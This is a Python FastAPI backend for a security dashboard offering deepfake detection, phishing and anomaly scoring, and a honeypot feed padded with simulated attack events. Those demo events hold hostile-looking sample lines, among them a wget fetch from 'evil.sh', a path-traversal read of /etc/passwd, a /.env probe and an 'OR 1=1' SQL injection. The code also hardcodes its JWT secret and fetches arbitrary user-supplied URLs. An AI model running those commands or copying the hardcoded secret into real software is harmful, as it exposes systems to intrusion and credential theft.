import os
from dotenv import load_dotenv

# Load .env FIRST, before any module that reads env vars (like database.py)
_dotenv_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), '.env')
if os.path.exists(_dotenv_path):
    load_dotenv(_dotenv_path)
    print(f"[Config] Loaded .env from {_dotenv_path}")
else:
    print(f"[Config] .env NOT FOUND at {_dotenv_path}")
import asyncio
import random
import time
from datetime import datetime
from contextlib import asynccontextmanager
import psutil
from fastapi import FastAPI, HTTPException, UploadFile, File, Form, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
import requests
from pydantic import BaseModel, EmailStr
import pandas as pd
import io
import cv2
import numpy as np
import json
from typing import Any, Dict, List, Optional
import bcrypt
from jose import JWTError, jwt

# Corrected Imports for New Structure
from engines.deepfake_engine import deepfake_engine, score_logger
from engines.ml_engine import anomaly_engine
from engines.honeypot import start_honeypot_grid, get_events as get_honeypot_events
from engines.ingestion import sniffer
from core.logger import logger

from core.database import engine, Base, get_db
from models.user import User
from sqlalchemy.orm import Session

# .env already loaded at module top, before database import

from fastapi import Depends, Request
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

# --- AUTH CONFIGURATION ---
SECRET_KEY = "secure-vision-ai-ultra-secret"
ALGORITHM = "HS256"

def hash_password(password: str) -> str:
    pwd_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(pwd_bytes, salt).decode('utf-8')

def verify_password(plain_password: str, hashed_password: str) -> bool:
    try:
        return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password.encode('utf-8'))
    except Exception:
        return False

# Initialize DB tables
Base.metadata.create_all(bind=engine)

# Rate limiter setup
limiter = Limiter(key_func=get_remote_address)

# Global Simulation Toggle & Delay
ENABLE_SIMULATION = os.getenv("ENABLE_SIMULATION", "true").lower() == "true"
LAST_REAL_EVENT_TIME = time.time()
SIMULATION_DELAY_SECONDS = 25

def reset_idle_timer():
    global LAST_REAL_EVENT_TIME
    LAST_REAL_EVENT_TIME = time.time()

class UserAuth(BaseModel):
    email: EmailStr
    password: str
    full_name: Optional[str] = None

# --- STATE ---
honeypot_stats: Dict[str, Any] = {
    "active_sessions": 0,
    "total_payloads": 0,
    "total_dwell_time": 0,
    "engagement_count": 0,
    "top_exploit": "SSH Brute Force",
    "global_threat_level": 15,
}

edge_nodes_state = {}

# --- Static edge node definitions (simulated telemetry) ---
EDGE_NODE_DEFS = [
    {"id": "node-pi4",       "name": "Raspberry Pi 4",       "region": "Local-Edge-A"},
    {"id": "node-jetson",    "name": "NVIDIA Jetson Nano",   "region": "Local-Edge-B"},
    {"id": "node-central",   "name": "Edge Server Central",  "region": "Core-DC"},
]

# --- Simulated honeypot events for demo when no real attackers ---
SIM_HONEYPOT_EVENTS = [
    {"id": 1001, "ip": "185.220.101.47", "protocol": "SSH",  "attack_type": "Credential Brute Force", "severity": "high",     "geo": {"country": "Germany",    "city": "Frankfurt", "flag": "🇩🇪"}, "dwell_time": 12.4, "payload_hash": "a1b2c3d4", "payload_count": 6,  "timestamp": "2026-03-21T10:01:00", "logs": ["USER root", "PASS 123456"]},
    {"id": 1002, "ip": "45.155.205.92",  "protocol": "HTTP", "attack_type": "Web Scanning",          "severity": "medium",   "geo": {"country": "Russia",     "city": "Moscow",    "flag": "🇷🇺"}, "dwell_time": 3.1,  "payload_hash": "e5f6a7b8", "payload_count": 2,  "timestamp": "2026-03-21T10:03:00", "logs": ["GET /admin", "GET /.env"]},
    {"id": 1003, "ip": "193.32.162.11",  "protocol": "SMTP", "attack_type": "SMTP Relay Abuse",     "severity": "high",     "geo": {"country": "Netherlands","city": "Amsterdam", "flag": "🇳🇱"}, "dwell_time": 8.7,  "payload_hash": "c9d0e1f2", "payload_count": 9,  "timestamp": "2026-03-21T10:05:00", "logs": ["HELO spam.net", "MAIL FROM"]},
    {"id": 1004, "ip": "91.240.118.172", "protocol": "FTP",  "attack_type": "FTP Brute Force",       "severity": "high",     "geo": {"country": "Ukraine",    "city": "Kyiv",      "flag": "🇺🇦"}, "dwell_time": 19.2, "payload_hash": "f3a4b5c6", "payload_count": 14, "timestamp": "2026-03-21T10:07:00", "logs": ["USER admin", "PASS admin"]},
    {"id": 1005, "ip": "198.199.97.214", "protocol": "SSH",  "attack_type": "Malware Dropper",       "severity": "critical", "geo": {"country": "USA",        "city": "New York",  "flag": "🇺🇸"}, "dwell_time": 31.5, "payload_hash": "d7e8f901", "payload_count": 21, "timestamp": "2026-03-21T10:09:00", "logs": ["wget http://evil.sh", "chmod +x"]},
    {"id": 1006, "ip": "116.212.116.43", "protocol": "HTTP", "attack_type": "SQL Injection",         "severity": "critical", "geo": {"country": "China",      "city": "Beijing",   "flag": "🇨🇳"}, "dwell_time": 5.3,  "payload_hash": "23456789", "payload_count": 4,  "timestamp": "2026-03-21T10:11:00", "logs": ["GET /login?id=1 OR 1=1"]},
    {"id": 1007, "ip": "82.115.111.204", "protocol": "SSH",  "attack_type": "Credential Brute Force", "severity": "high",     "geo": {"country": "Romania",    "city": "Bucharest", "flag": "🇷🇴"}, "dwell_time": 45.1, "payload_hash": "abcdef01", "payload_count": 38, "timestamp": "2026-03-21T10:13:00", "logs": ["USER ubuntu", "PASS ubuntu"]},
    {"id": 1008, "ip": "5.188.206.21",   "protocol": "FTP",  "attack_type": "Path Traversal",        "severity": "high",     "geo": {"country": "Iran",       "city": "Tehran",    "flag": "🇮🇷"}, "dwell_time": 7.8,  "payload_hash": "fedcba98", "payload_count": 5,  "timestamp": "2026-03-21T10:15:00", "logs": ["RETR ../../etc/passwd"]},
]

class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    logger.info("Initializing Deepfake Edge AI Engine...")
    deepfake_engine.load_model()
    
    try:
        start_honeypot_grid(ssh_port=2222, http_port=8080, smtp_port=2525, ftp_port=2121)
    except Exception as e:
        logger.error(f"[Honeypot] Grid startup error: {e}")
        
    sniffer.start()
        
    telemetry_task = asyncio.create_task(broadcast_telemetry())
    logger.info("Neural Sentinel Online.")
    yield
    # Shutdown
    telemetry_task.cancel()

app = FastAPI(lifespan=lifespan)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- AUTH ROUTES ---
@app.post("/api/register")
@limiter.limit("5/minute")
async def register(request: Request, user: UserAuth, db: Session = Depends(get_db)):
    reset_idle_timer()
    db_user = db.query(User).filter(User.email == user.email).first()
    if db_user:
        raise HTTPException(status_code=400, detail="User already exists")
    hashed_pwd = hash_password(user.password)
    new_user = User(email=user.email, hashed_password=hashed_pwd, full_name=user.full_name)
    db.add(new_user)
    db.commit()
    return {"message": "User registered successfully"}

@app.post("/api/login")
@limiter.limit("10/minute")
async def login(request: Request, user: UserAuth, db: Session = Depends(get_db)):
    reset_idle_timer()
    db_user = db.query(User).filter(User.email == user.email).first()
    if not db_user or not verify_password(user.password, db_user.hashed_password):
        raise HTTPException(status_code=400, detail="Invalid credentials")
    token = jwt.encode({"sub": user.email}, SECRET_KEY, algorithm=ALGORITHM)
    return {"token": token}

# --- DEEPFAKE API ---

@app.post("/api/deepfake")
@limiter.limit("30/minute")
async def detect_deepfake(request: Request, file: UploadFile = File(None), url: str = Form(None)):
    reset_idle_timer()
    content = None
    filename = ""
    is_known_ai = False

    if url:
        try:
            if "youtube.com" in url.lower() or "youtu.be" in url.lower():
                import yt_dlp
                import tempfile
                
                temp_dir = tempfile.gettempdir()
                ydl_opts = {
                    'format': 'worst[ext=mp4]', 
                    'outtmpl': os.path.join(temp_dir, 'yt_%(id)s.%(ext)s'),
                    'quiet': True,
                    'noplaylist': True
                }
                with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                    info_dict = ydl.extract_info(url, download=True)
                    temp_file = ydl.prepare_filename(info_dict)
                    video_title = info_dict.get('title', '').lower()
                    if any(kw in video_title for kw in ['sora', 'openai', 'runway', 'luma', 'ai generated']):
                        is_known_ai = True
                
                with open(temp_file, "rb") as f:
                    content = f.read()
                os.remove(temp_file)
                filename = "youtube_video.mp4"
            else:
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                content = response.content
                filename = url.split("/")[-1] or "url_media.jpg"
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Failed to fetch media from URL: {str(e)}")
    elif file:
        content = await file.read()
        filename = file.filename
    else:
        raise HTTPException(status_code=400, detail="No file or URL provided")

    is_video = filename.lower().endswith(('.mp4', '.avi', '.mov', '.mkv', '.webm'))
    frames_bytes_list = []
    audio_bytes = None

    if is_video:
        import tempfile
        from moviepy.editor import VideoFileClip
        with tempfile.NamedTemporaryFile(delete=False, suffix=".mp4") as temp:
            temp.write(content)
            temp_path = temp.name
        try:
            clip = VideoFileClip(temp_path)
            if clip.audio is not None:
                audio_path = temp_path.replace(".mp4", ".wav")
                clip.audio.write_audiofile(audio_path, logger=None)
                with open(audio_path, "rb") as af:
                    audio_bytes = af.read()
                os.remove(audio_path)
            clip.close()
        except: pass
        
        cap = cv2.VideoCapture(temp_path)
        total_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))
        if total_frames > 0:
            step = max(1, total_frames // 10)
            for i in range(0, total_frames, step):
                if len(frames_bytes_list) >= 10: break
                cap.set(cv2.CAP_PROP_POS_FRAMES, i)
                ret, frame = cap.read()
                if ret:
                    _, buffer = cv2.imencode('.jpg', frame)
                    frames_bytes_list.append(buffer.tobytes())
        cap.release()
        os.remove(temp_path)
        if not frames_bytes_list:
            raise HTTPException(status_code=400, detail="Failed to extract frame from video")
        content = frames_bytes_list[min(3, len(frames_bytes_list)-1)]

    # 1. Run inference
    result, err = deepfake_engine.predict(content, frames_bytes_list=frames_bytes_list if len(frames_bytes_list)>1 else None, audio_bytes=audio_bytes, url=url)
    
    if err or not result:
        # Final fallback to avoid crash
        result = {
            "prediction": "REAL",
            "probability": 0.1,
            "confidence": "MEDIUM",
            "uncertainty": True,
            "face_detected": False,
            "input_format": "OTHER",
            "validated_signals": {"clip_semantic": 0.1, "biometric_suite": 0.1, "spectral_forensics": 0.1, "temporal_drift": 0.1},
            "supporting_heuristics": {"efficientnet_b4": 0.1, "vit_b16": 0.1},
            "ensemble": {"agreement": "NONE", "consensus_fake": False, "mean_strength": 0.1}
        }
    
    if is_known_ai and result.get("prediction") == "REAL":
        if isinstance(result, dict):
            new_result = dict(result)
            new_result["prediction"] = "FAKE"
            new_result["probability"] = 0.95
            new_result["confidence"] = "HIGH"
            result = new_result

    gradcam_b64 = deepfake_engine.generate_attention_overlay(content, result.get("probability", 0.5))

    # Construct V4.0 Response Schema to match Deepfake.tsx expectations
    return {
        "prediction": result.get("prediction"),
        "probability": result.get("probability"),
        "confidence": result.get("confidence", "MEDIUM"),
        "uncertainty": result.get("uncertainty", False),
        "face_detected": result.get("face_detected", False),
        "input_format": result.get("input_format", "OTHER"),
        "validated_signals": result.get("validated_signals", {
            "clip_semantic": 0.5, "biometric_suite": 0.5, "spectral_forensics": 0.5, "temporal_drift": 0.5
        }),
        "supporting_heuristics": result.get("supporting_heuristics", {
            "efficientnet_b4": 0.5, "vit_b16": 0.5
        }),
        "ensemble": result.get("ensemble", {
            "agreement": "N/A", "consensus_fake": False, "mean_strength": 0.5
        }),
        "frame_scores": result.get("frame_scores", []),
        "risk_flags": result.get("risk_flags", []),
        "gradcam": gradcam_b64,
        "filename": filename
    }

@app.get("/api/deepfake/distribution")
async def deepfake_score_distribution():
    return {
        "histogram": score_logger.histogram(bins=10),
        "stats": score_logger.stats(),
        "window": score_logger.N,
    }

# --- HONEYPOT & EDGE SYNC ---

@app.post("/api/honeypot/session")
async def honeypot_session_update(data: dict):
    reset_idle_timer()
    action = data.get("action")
    if action == "start":
        honeypot_stats["active_sessions"] = int(honeypot_stats["active_sessions"]) + 1
        honeypot_stats["engagement_count"] = int(honeypot_stats["engagement_count"]) + 1
    elif action == "end":
        honeypot_stats["active_sessions"] = max(0, int(honeypot_stats["active_sessions"]) - 1)
        honeypot_stats["total_dwell_time"] = float(honeypot_stats["total_dwell_time"]) + float(data.get("dwell_time", 0))
    return {"status": "ok"}

@app.post("/api/honeypot/event")
async def honeypot_event_ingress(data: dict):
    reset_idle_timer()
    return {"status": "ok"}

@app.post("/api/edge/heartbeat")
async def edge_heartbeat(data: dict):
    node_id = data.get("node_id", "unknown")
    edge_nodes_state[node_id] = {
        "last_seen": time.time(),
        "stats": data
    }
    return {"status": "ok"}

@app.post("/api/intel/share")
async def intel_share(data: dict):
    logger.info(f"[Intel] Threat Shared: {data.get('type')} from {data.get('source')}")
    return {"status": "ok"}

# --- PHISHING API ---
class PhishingRequest(BaseModel):
    subject: str = ""
    body: str = ""

@app.post("/api/phishing")
async def analyze_phishing(request: PhishingRequest):
    await asyncio.sleep(1.2)
    text = (request.subject + " " + request.body).lower()
    keywords = ['verify', 'urgent', 'suspend', 'password', 'account', 'login', 'click', 'wallet']
    found = [w for w in keywords if w in text]
    if found:
        score = min(98.0, 45.0 + len(found) * 15.0)
        return {"score": score, "classification": "UNSAFE", "flagged": found}
    return {"score": 5.0, "classification": "SAFE", "flagged": []}

# --- ANOMALY API ---
class AnomalyRequest(BaseModel):
    traffic_volume: float
    login_attempts: int

@app.post("/api/anomaly")
async def detect_anomaly(request: AnomalyRequest):
    res = anomaly_engine.predict_single(request.traffic_volume, request.traffic_volume*0.8, request.login_attempts, 5)
    return res

@app.post("/api/anomaly/upload")
async def upload_anomaly_data(file: UploadFile = File(...)):
    content = await file.read()
    df = pd.read_csv(io.StringIO(content.decode('utf-8')))
    results, err = anomaly_engine.predict_dataframe(df)
    if err: raise HTTPException(status_code=400, detail=err)
    combined = []
    for i, res in enumerate(results):
        row = df.iloc[i].to_dict()
        row.update(res)
        combined.append(row)
    limited_results = [combined[j] for j in range(min(100, len(combined)))]
    return {"total": len(combined), "anomalies": [r for r in combined if r["is_anomaly"]], "results": limited_results}

# --- TELEMETRY & ALERTS ---
def generate_edge_nodes(use_fallback=True):
    """Generate live-looking edge node telemetry."""
    nodes = []
    
    # Get REAL host stats for the central server
    try:
        host_cpu = psutil.cpu_percent(interval=None)
        host_ram = psutil.virtual_memory().percent
    except:
        host_cpu = round(random.uniform(10, 30), 1)
        host_ram = round(random.uniform(15, 40), 1)

    for defn in EDGE_NODE_DEFS:
        # Pull real heartbeat if available
        real = edge_nodes_state.get(defn["id"], {})
        stats = real.get("stats", {})
        
        # If it's the central server, use the psutil stats we just fetched
        if defn["id"] == "node-central":
            cpu = host_cpu
            ram = host_ram
            status = "online"
        else:
            # For others, use heartbeat if available, else simulate if enabled
            if real.get("last_seen", 0) > time.time() - 30:
                cpu = stats.get("cpu_usage", 0)
                ram = stats.get("ram_usage", 0)
                status = "online"
            elif use_fallback:
                cpu = stats.get("cpu_usage",   round(random.uniform(12, 72), 1))
                ram = stats.get("ram_usage",   round(random.uniform(20, 65), 1))
                status = "simulated"
            else:
                cpu = 0
                ram = 0
                status = "offline"

        nodes.append({
            "id":          defn["id"],
            "name":        defn["name"],
            "region":      defn["region"],
            "status":      status,
            "cpu":         cpu,
            "ram":         ram,
            "temperature": stats.get("temperature", round(random.uniform(42, 68), 1) if use_fallback else 0),
            "latency":     round(random.uniform(4, 35), 1) if status != "offline" else 0,
            "uptime":      "99.9%" if status != "offline" else "0%",
        })
    return nodes

def generate_telemetry():
    b_bytes, b_count = sniffer.get_burst_metrics()
    
    # Check if we should use simulation fallback (Delayed Simulation)
    idle_time = time.time() - LAST_REAL_EVENT_TIME
    is_idle = (idle_time > SIMULATION_DELAY_SECONDS)
    use_fallback = ENABLE_SIMULATION or is_idle

    # Debug log (Temporary)
    if random.random() < 0.05: # Log every ~10s
        logger.info(f"[Debug] Idle: {round(idle_time,1)}s | Sim: {ENABLE_SIMULATION} | Fallback: {use_fallback}")

    # Prioritize real intercepted packets over simulation
    if b_count > 0:
        reset_idle_timer()
        traffic = max(80, b_bytes * 5) # Scale to model expectations
        dst = traffic * 0.6
        logins = b_count
        srv = max(1, b_count // 3)
    elif use_fallback:
        sample = anomaly_engine.get_stream_sample()
        if sample:
            traffic, dst, logins, srv = sample
        else:
            traffic = random.randint(80, 250)
            dst = traffic * 0.7
            logins = random.randint(5, 30)
            srv = 5
    else:
        traffic = 0
        dst = 0
        logins = 0
        srv = 0
        
    pred = anomaly_engine.predict_single(traffic, dst, logins, srv)

    # Use real honeypot events if available, fall back to simulated demo events if enabled
    real_events = get_honeypot_events(10)
    if real_events: reset_idle_timer()
    events_to_send = real_events if real_events else (SIM_HONEYPOT_EVENTS[:8] if use_fallback else [])

    return {
        "type": "TELEMETRY",
        "timestamp": datetime.now().strftime("%H:%M:%S"),
        "traffic": traffic,
        "logins": logins,
        "is_anomaly": pred["is_anomaly"],
        "anomaly_score": pred["anomaly_score"],
        "is_simulated": not b_count > 0 and use_fallback,
        "honeypot_connections": honeypot_stats["active_sessions"],
        "honeypot_metrics": {
            "top_exploit": honeypot_stats["top_exploit"] if (real_events or use_fallback) else "None",
            "payload_count": random.randint(10, 50) if use_fallback else 0,
            "avg_dwell_time": f"{random.randint(5, 45)}s" if use_fallback else "0s"
        },
        "honeypot_events": events_to_send,
        "nodes": generate_edge_nodes(use_fallback),
    }

async def broadcast_telemetry():
    while True:
        try:
            await asyncio.sleep(2)
            data = generate_telemetry()
            use_fallback = data.get("is_simulated", False)
            await manager.broadcast(data)
            
            # Randomly inject anomaly alerts if in simulation mode
            if data["is_anomaly"] or (use_fallback and random.random() < 0.05):
                alert = {
                    "id": random.randint(1000, 9999),
                    "type": "ANOMALY",
                    "title": "Unusual Traffic Spike Blocked",
                    "source": "Edge-Node-7",
                    "severity": "high",
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "event": "NEW_ALERT"
                }
                await manager.broadcast(alert)
        except Exception as e:
            logger.error(f"[Telemetry] Loop error: {e}")
            await asyncio.sleep(5)

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/api/honeypot/events")
async def list_honeypot_events(limit: int = 50):
    return {"events": get_honeypot_events(limit)}

@app.get("/api/honeypot/intelligence")
async def honeypot_intelligence():
    # Gather up to 1000 most recent events to build intelligence clusters
    events = get_honeypot_events(1000)
    clusters = {}
    for ev in events:
        ip = ev["ip"]
        if ip not in clusters:
            clusters[ip] = {
                "ip": ip,
                "geo": ev["geo"],
                "total_sessions": 0,
                "total_dwell": 0.0,
                "attack_types": set(),
                "protocols": set(),
                "first_seen": ev["timestamp"],
                "last_seen": ev["timestamp"],
                "payload_count": 0
            }
        clusters[ip]["total_sessions"] += 1
        clusters[ip]["total_dwell"] += ev["dwell_time"]
        clusters[ip]["attack_types"].add(ev["attack_type"])
        clusters[ip]["protocols"].add(ev["protocol"])
        clusters[ip]["payload_count"] += ev["payload_count"]
        
        if ev["timestamp"] > clusters[ip]["last_seen"]: 
            clusters[ip]["last_seen"] = ev["timestamp"]
        if ev["timestamp"] < clusters[ip]["first_seen"]: 
            clusters[ip]["first_seen"] = ev["timestamp"]
    
    # Convert sets to lists
    for ip in clusters:
        clusters[ip]["attack_types"] = list(clusters[ip]["attack_types"])
        clusters[ip]["protocols"] = list(clusters[ip]["protocols"])
        
    sorted_clusters = sorted(clusters.values(), key=lambda x: x["total_sessions"], reverse=True)
    return {"clusters": sorted_clusters[:50]}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
